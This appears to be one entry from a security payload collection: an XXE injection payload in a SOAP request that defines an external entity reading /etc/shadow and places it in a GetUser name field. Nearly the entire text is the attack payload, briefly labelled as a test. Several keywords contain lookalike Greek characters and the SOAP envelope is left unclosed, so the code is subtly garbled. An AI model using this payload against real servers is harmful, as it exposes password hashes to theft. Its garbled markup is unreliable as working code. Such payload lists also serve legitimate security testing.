# Marfaak AI Security - ΧXE in SOAP request

**WARNING: This payload tests XXE in SΟΑP request.**

<?xml version="1.0" encoding="UTF-8"?>
<!DΟCΤYPE foo [
  <!ΕΝTIΤY xxe SYSTEM "file:///etc/shadow">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Βody>
<GetUser><name>&xxe;</name></GetUser>
